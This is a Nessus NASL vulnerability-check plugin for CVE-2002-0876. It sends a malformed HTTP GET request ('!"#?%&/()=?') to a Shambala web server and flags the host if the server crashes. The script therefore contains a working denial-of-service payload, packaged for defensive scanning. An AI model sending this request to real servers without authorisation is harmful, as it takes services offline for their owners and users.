#
# This script was written by Michel Arboi <arboi@alussinan.org>
#
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
#      Erik Anderson <eanders@carmichaelsecurity.com>
#      Added BugtraqID and CVE
#
# See the Nessus Scripts License for details
#
# Status: untested

# " in strings are not great in NASL
req = string("!", raw_string(0x22),"#?%&/()=?");

if(description)
{
 script_id(10967);
 script_bugtraq_id(4897);
 script_version ("$Revision: 1.10 $");
 script_cve_id("CVE-2002-0876");
 name["english"] = "Shambala web server DoS";
 name["francais"] = "Déni de service contre le serveur web Shambala";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = string("It was possible to kill the web server by\n",
	"sending this request :\nGET ", req, "\n\n",
	"Workaround : install a safer server or upgrade it\n\n",
	"Risk factor : Medium");

 script_description(english:desc["english"]);
 
 summary["english"] = "Kills a Shambala web server";
 script_summary(english:summary["english"]);
 
 script_category(ACT_DENIAL);
 
 
 script_copyright(english:"This script is Copyright (C) 2002 Michel Arboi");
 
 family["english"] = "Denial of Service";
 script_family(english:family["english"]);
 script_require_ports("Services/www", 80);
 script_dependencies("find_service.nes", "http_version.nasl", "no404.nasl");
 exit(0);
}

########
include("http_func.inc");

port = get_http_port(default:80);

if(get_port_state(port))
{
  if(http_is_dead(port:port))exit(0);
  soc = http_open_socket(port);
  if(soc)
  {
  data = http_get(item:req, port:port);
  send(socket:soc, data:data);
  r = http_recv(socket:soc);
  http_close_socket(soc);
 
  if(http_is_dead(port:port))security_warning(port);
  }
}
